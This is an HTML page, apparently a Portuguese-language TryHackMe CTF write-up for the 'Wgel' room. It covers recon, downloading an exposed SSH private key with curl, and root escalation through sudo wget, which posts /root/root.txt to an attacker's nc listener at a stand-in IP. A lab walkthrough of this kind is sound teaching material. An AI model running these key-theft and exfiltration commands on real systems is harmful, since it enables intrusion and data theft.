@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+
+<head>
+   <meta charset="UTF-8">
+   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+   <link href="https://fonts.googleapis.com/css2?family=Raleway:wght@400;700&display=swap" rel="stylesheet">
+   <link rel="stylesheet" href="../../../../assets/css/articles.css">
+   <link rel="icon" type="image/png" href="/img/home/favicon.png" />
+   <title>ctf.</title>
+</head>
+
+<body>
+    <header class="header">
+        <nav class="breadcrumb">
+            <a href="/index.html">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                    stroke-linejoin="round">
+                    <path d="M19 12H5M12 19l-7-7 7-7" />
+                </svg>
+                Voltar
+            </a>
+        </nav>
+        <div class="header-controls">
+            <div class="language-toggle">
+                <a href="../../../pt-br/writeups/tryhackme/wgel.html" class="active" title="Português (Brasil)">
+                    <svg viewBox="0 0 72 48" xmlns="http://www.w3.org/2000/svg">
+                        <rect width="72" height="48" fill="#009c3b" />
+                        <polygon points="36,4 68,24 36,44 4,24" fill="#ffdf00" />
+                        <circle cx="36" cy="24" r="12" fill="#002776" />
+                        <path d="M24.5,21 Q36,28 47.5,21" stroke="#fff" stroke-width="2.5" fill="none" />
+                        <circle cx="30" cy="28" r="0.6" fill="#fff" />
+                        <circle cx="33" cy="30" r="0.5" fill="#fff" />
+                        <circle cx="36" cy="31" r="0.6" fill="#fff" />
+                        <circle cx="39" cy="30" r="0.5" fill="#fff" />
+                        <circle cx="42" cy="28" r="0.6" fill="#fff" />
+                    </svg>
+                </a>
+                <a href="../../../en-us/writeups/tryhackme/wgel.html" title="English (US)">
+                    <svg viewBox="0 0 36 24" xmlns="http://www.w3.org/2000/svg">
+                        <rect width="36" height="24" fill="#fff" />
+                        <rect width="36" height="1.85" y="0" fill="#b22234" />
+                        <rect width="36" height="1.85" y="3.7" fill="#b22234" />
+                        <rect width="36" height="1.85" y="7.4" fill="#b22234" />
+                        <rect width="36" height="1.85" y="11.1" fill="#b22234" />
+                        <rect width="36" height="1.85" y="14.8" fill="#b22234" />
+                        <rect width="36" height="1.85" y="18.5" fill="#b22234" />
+                        <rect width="36" height="1.85" y="22.2" fill="#b22234" />
+                        <rect width="14.4" height="12.95" fill="#3c3b6e" />
+                    </svg>
+                </a>
+            </div>
+        </div>
+    </header>
+   <main class="content">
+      <header class="article-header">
+         <h1>Wgel CTF</h1>
+         <p class="meta">
+            TryHackMe &middot; Easy by <a href="https://www.linkedin.com/in/brennocm/">Brenno M.</a>
+         </p>
+      </header>
+      <section class="article-body writeup-body">
+         <p>Wgel encadeia a descoberta de uma <b>chave SSH</b> exposta em um diretório oculto do servidor web e a escalação de privilégios abusando de <b>sudo wget</b> segundo o GTFOBins.</p>
+
+         <figure class="attack-flow">
+            <figcaption>Fluxo do ataque</figcaption>
+            <svg viewBox="0 0 660 130" role="img" aria-label="Fluxo do ataque" xmlns="http://www.w3.org/2000/svg"><line x1="24" y1="32.0" x2="24" y2="52.0" stroke="#5c7a12" stroke-width="2"/><line x1="24" y1="78.0" x2="24" y2="98.0" stroke="#5c7a12" stroke-width="2"/><circle cx="24" cy="19.0" r="13" fill="#16200a" stroke="#9fef00" stroke-width="2"/><text x="24" y="19.0" fill="#9fef00" font-size="12" font-weight="700" text-anchor="middle" dominant-baseline="central">1</text><text fill="#e4e4e4" font-size="15" font-weight="600" dominant-baseline="central"><tspan x="54" y="19.0">Reconhecimento</tspan></text><circle cx="24" cy="65.0" r="13" fill="#16200a" stroke="#9fef00" stroke-width="2"/><text x="24" y="65.0" fill="#9fef00" font-size="12" font-weight="700" text-anchor="middle" dominant-baseline="central">2</text><text fill="#e4e4e4" font-size="15" font-weight="600" dominant-baseline="central"><tspan x="54" y="65.0">Foothold</tspan></text><circle cx="24" cy="111.0" r="13" fill="#16200a" stroke="#9fef00" stroke-width="2"/><text x="24" y="111.0" fill="#9fef00" font-size="12" font-weight="700" text-anchor="middle" dominant-baseline="central">3</text><text fill="#e4e4e4" font-size="15" font-weight="600" dominant-baseline="central"><tspan x="54" y="111.0">Escalação - sudo wget (GTFOBins)</tspan></text></svg>
+         </figure>
+
+         <h2>Reconhecimento</h2>
+
+         <p>O Nmap revela SSH e HTTP. O comentário no código-fonte da página cita o usuário <i>jessie</i>. A enumeração encontra o diretório <i>/sitemap/</i>, que expõe uma pasta <i>.ssh</i> com a chave privada.</p>
+
+         <pre class="code-block"><code>nmap -sS -sV -Pn &lt;IP&gt;
+gobuster dir -u http://&lt;IP&gt; -w big.txt
+gobuster dir -u http://&lt;IP&gt;/sitemap -w big.txt
+curl http://&lt;IP&gt;/sitemap/.ssh/id_rsa -o id_rsa</code></pre>
+
+         <h2>Foothold</h2>
+
+         <p>Com a chave, autentica-se por SSH como <i>jessie</i> e localiza-se a flag de usuário.</p>
+
+         <pre class="code-block"><code>chmod 600 id_rsa
+ssh -i id_rsa jessie@&lt;IP&gt;
+find / -name user.txt 2&gt;/dev/null</code></pre>
+
+         <h2>Escalação - sudo wget (GTFOBins)</h2>
+
+         <p>O <code>sudo -l</code> mostra que <i>jessie</i> pode executar <b>/usr/bin/wget</b> como root. Pelo GTFOBins, usa-se <code>--post-file</code> para exfiltrar a flag de root para um listener do atacante (ou, alternativamente, sobrescrever /etc/passwd).</p>
+
+         <pre class="code-block"><code>sudo -l
+# no atacante:
+nc -lvnp 4444
+# na vítima:
+sudo /usr/bin/wget --post-file=/root/root.txt http://&lt;MEU_IP&gt;:4444</code></pre>
+      </section>
+   </main>
+   <br>
+   <footer>
+      <p>&copy; 20∞</p>
+   </footer>
+    <script src="../../../../assets/js/article-toc.js" defer></script>
+</body>
+
+</html>
